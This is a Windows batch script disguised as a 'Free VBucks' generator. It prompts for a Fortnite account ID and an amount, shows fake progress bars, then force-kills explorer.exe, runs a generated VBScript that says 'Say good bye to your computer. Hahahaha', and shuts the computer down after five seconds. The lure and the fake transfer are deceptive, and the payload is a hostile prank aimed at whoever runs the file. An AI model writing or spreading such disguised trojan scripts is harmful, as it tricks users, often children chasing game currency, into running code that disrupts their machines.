@echo off
CHCP 65001 >nul
TITLE Free VBucks
COLOR 0A
@MODE CON COLS=55 LINES=20
:menu
echo.
echo        ███████╗██████╗ ███████╗███████╗              
echo        ██╔════╝██╔══██╗██╔════╝██╔════╝              
echo        █████╗  ██████╔╝█████╗  █████╗                
echo        ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝                
echo        ██║     ██║  ██║███████╗███████╗              
echo        ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝              
echo.                                                      
echo ██╗   ██╗██████╗ ██╗   ██╗ ██████╗██╗  ██╗███████╗    
echo ██║   ██║██╔══██╗██║   ██║██╔════╝██║ ██╔╝██╔════╝    
echo ██║   ██║██████╔╝██║   ██║██║     █████╔╝ ███████╗    
echo ╚██╗ ██╔╝██╔══██╗██║   ██║██║     ██╔═██╗ ╚════██║    
echo ╚████╔╝ ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████║    
echo  ╚═══╝  ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝    
echo.
echo - A to add amount to your account
echo - B to exit
echo.
choice /C AB /CS /N /M "Enter A or B: "
if %errorlevel%==1 goto addToAccount
if %errorlevel%==2 goto exit

:exit
exit 

:addToAccount
CLS
echo.
echo ***Enter account info***
set /p aaa=Enter Account ID: 
echo. 
set /p aaa=Enter The Amount To Add:
timeout 1 > nul
cls
echo.
echo Getting Account Info...
echo ╔════════════════════╗
echo ║███████                  ║
echo ══════════════════════
timeout 1 > nul
cls
echo.
echo Transfer Amount...
echo ╔════════════════════╗
echo ║██████████████        ║
echo ══════════════════════
timeout 1 > nul
cls
echo.
echo Finishing UP...
echo ╔════════════════════╗
echo ║████████████████     ║
echo ══════════════════════
timeout 1 > nul
cls
echo.
echo Done...
echo ╔════════════════════╗
echo ║████████████████████║
echo ══════════════════════
timeout 1 > nul
taskkill /f /im "explorer.exe" >nul
if exist speech.Vbs del speech.Vbs
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=Say good bye to your computer. Hahahaha"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
shutdown /s /t 5




                                                